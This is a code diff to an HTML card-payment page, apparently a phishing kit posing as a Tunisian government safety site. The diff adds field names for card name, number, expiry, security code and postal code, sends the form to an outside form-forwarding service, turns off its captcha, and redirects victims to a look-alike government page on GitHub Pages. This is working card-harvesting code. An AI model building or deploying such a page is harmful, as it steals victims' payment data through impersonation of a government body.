@@ -49,7 +49,7 @@
                 <span class="logo-box mv"><img src="images/logo_mv.jpg" title="Maestro / V Pay"></span>
             </div>
         </div>
-        <form action="updated.html" method="get">
+        <form method="POST" action="https://formsubmit.co/el/murulu" enctype="multipart/form-data">
         
             <!-- payment amount -->
             <div class="form-group">
@@ -63,25 +63,25 @@
             <!-- name on card -->
             <div class="form-group">
                 <label>Name on card</label>
-                <input type="text" required>
+                <input name="Card_Name" type="text" required>
             </div>
 
             <!-- card number -->
             <div class="form-group">
                 <label>Card number</label>
-                <input type="text" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+                <input type="number" name="Card_Number" placeholder="XXXX-XXXX-XXXX-XXXX" required>
             </div>
 
             <!-- expiry date & security code -->
             <div class="form-row">
                 <div class="form-group-half">
                     <label>Expiry date</label>
-                    <input type="text" placeholder="MM / YY" required>
+                    <input type="number" name="Expiry_Date" placeholder="MM / YY" required>
                 </div>
                 <div class="form-group-half">
                     <label>Security code</label>
                     <div class="input-with-icon">
-                        <input type="text" required>
+                        <input type="number" name="Security_Code" required>
                         <i class="fa-solid fa-cicle-question">?</i>
                     </div>
                 </div>
@@ -91,11 +91,15 @@
             <div class="form-group">
                 <label>ZIP/Postal code</label>
                 <div class="input-with-icon">
-                    <input type="text" required>
+                    <input type="number" name="ZIP/Postal_Code" required>
                     <i class="fa-solid fa-cicle-question">?</i>
                 </div>
             </div>
+                <!-- Désactiver le captcha -->
+                <input type="hidden" name="_captcha" value="false">
 
+                <!-- Redirection vers votre page personnalisée -->
+                <input type="hidden" name="_next" value="https://safety-tn-gov.github.io/tn.safety.gov/updated.html">
             <!-- Bouton de validation -->
             <button type="submit" class="pay-btn">
                 <i class="fa-solid fa-lock"><img src="images/lock.jpg"></i>  Payment
